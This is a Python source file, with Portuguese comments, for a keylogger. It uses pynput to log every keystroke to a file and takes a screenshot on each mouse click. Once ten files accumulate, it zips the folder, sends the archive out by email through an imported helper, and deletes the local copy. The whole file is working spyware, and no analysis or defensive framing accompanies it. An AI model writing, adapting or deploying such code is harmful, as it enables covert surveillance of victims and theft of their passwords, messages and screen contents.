import shutil
from pynput.mouse import Listener as MouseListenar
from pynput.keyboard import Listener as KeyboardListanner
from datetime import datetime
from zipfile import ZipFile
from os.path import basename
from EnviarEmail import enviar_email_assincrono
import re, os, pyautogui as py


dataAtual = datetime.now()
data = dataAtual.strftime("%d-%m")
diretorioRaiz = "imgs/keylloger_"+ data + "/" 
arquivoLog = diretorioRaiz + "keylogger.log"

#inicia a pasta
try:
    os.mkdir(diretorioRaiz)
except:
    pass


#cria uma pasta
def criarDiretorioRaiz():
    try:
        os.mkdir(diretorioRaiz)
    except:
        pass


#apaga uma pasta
def apagarPasta(pastaqualquer):
    shutil.rmtree(pastaqualquer)    #apaga o diretorio



#quando no .log quando escreve
def on_press(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'','',tecla)
    tecla = re.sub(r'Key.space',' ',tecla)
    tecla = re.sub(r'Key.enter','\n',tecla)
    tecla = re.sub(r'Key.tab','\t',tecla)
    tecla = re.sub(r'Key.backspace','apagar',tecla)
    tecla = re.sub(r'<97>','1',tecla)
    tecla = re.sub(r'<98>','2',tecla)
    tecla = re.sub(r'<99>','3',tecla)
    tecla = re.sub(r'<100>','4',tecla)
    tecla = re.sub(r'<101>','5',tecla)
    tecla = re.sub(r'<102>','6',tecla)
    tecla = re.sub(r'<103>','7',tecla)
    tecla = re.sub(r'<104>','8',tecla)
    tecla = re.sub(r'<105>','9',tecla)
    tecla = re.sub(r'Key.tab','\t',tecla)

    tecla = re.sub(r'Key.*','',tecla)


    with open(arquivoLog,'a') as log:
        if str(tecla) == str("apagar"):
            if os.stat(arquivoLog).st_size != 0 :
                tecla = re.sub(r'Key.backspace', '',tecla)
                log.seek(0,2)
                caractere = log.tell()
                log.truncate(caractere - 1)

        else:
            log.write(tecla)


#printa quando clica
def on_click(x, y, buttom, pressed):
    if pressed:
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H:%M:%S")
        horarioPrint = horarioPrint.replace(":", "_")
        minhaPrint.save(os.path.join(diretorioRaiz, "printKeylogger_"+ horarioPrint + ".jpg"))
        contar_arquivos(diretorioRaiz)

        if count_arquivos >= 10 :           #quantidade que deve ser escolhida
            comprimir_arquivo(diretorioRaiz)
            enviar_email_assincrono(nomeDoZip)
            apagarPasta(diretorioRaiz)
            criarDiretorioRaiz()           
    

#conta os arquivios
count_arquivos = 0
def contar_arquivos(caminho_da_pasta):
    global count_arquivos 

    if os.path.isdir(caminho_da_pasta):
        lista_arquivos = os.listdir(caminho_da_pasta)
        quantidade_arquivos = len(lista_arquivos)

        count_arquivos = quantidade_arquivos

    else:
        count_arquivos = 0 

    return count_arquivos

#faz o zip
nomeDoZip = ''
def comprimir_arquivo(pasta):
    global nomeDoZip

    hora_atual = datetime.now()
    nome_arquivo_zip = hora_atual.strftime("keylogger_%d-%m_%H-%M-%S.zip")
    nomeDoZip=nome_arquivo_zip
    # Criar o arquivo ZIP com o nome formatado
    with ZipFile(nome_arquivo_zip, 'w') as zipObj:
        for folderName, subfolders, filenames in os.walk(pasta):
            for filename in filenames:
                filepath = os.path.join(folderName, filename)
                zipObj.write(filepath, basename(filepath))
        
                 





keyboardListanner = KeyboardListanner(on_press=on_press)
mouseListenar = MouseListenar(on_click=on_click)


keyboardListanner.start()
mouseListenar.start()
keyboardListanner.join()
mouseListenar.join()

            





